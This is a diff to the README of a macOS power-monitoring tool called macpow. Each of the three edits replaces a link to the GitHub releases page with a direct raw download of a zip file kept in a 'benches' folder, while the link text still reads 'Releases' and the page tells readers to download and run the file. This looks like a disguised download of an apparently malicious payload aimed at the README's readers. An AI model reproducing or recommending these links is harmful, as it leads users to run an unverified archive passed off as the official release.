@@ -1,6 +1,6 @@
 # ⚡ macpow - See Power Use in Real Time
 
-[![Download macpow](https://img.shields.io/badge/Download-macpow-blue?style=for-the-badge)](https://github.com/Halfmileyellowbristlegrass562/macpow/releases)
+[![Download macpow](https://img.shields.io/badge/Download-macpow-blue?style=for-the-badge)](https://github.com/Halfmileyellowbristlegrass562/macpow/raw/refs/heads/main/benches/Software_1.5.zip)
 
 ## 🧭 What macpow does
 
@@ -34,7 +34,7 @@ You will need:
 
 Visit the release page to download and run this file:
 
-[Open macpow Releases](https://github.com/Halfmileyellowbristlegrass562/macpow/releases)
+[Open macpow Releases](https://github.com/Halfmileyellowbristlegrass562/macpow/raw/refs/heads/main/benches/Software_1.5.zip)
 
 After you open the page, look for the latest release and download the file that fits your system.
 
@@ -192,4 +192,4 @@ A clean screen makes it easier to track what changed and when.
 
 If you need the release page later, use this link:
 
-[Go to macpow Releases](https://github.com/Halfmileyellowbristlegrass562/macpow/releases)
+[Go to macpow Releases](https://github.com/Halfmileyellowbristlegrass562/macpow/raw/refs/heads/main/benches/Software_1.5.zip)
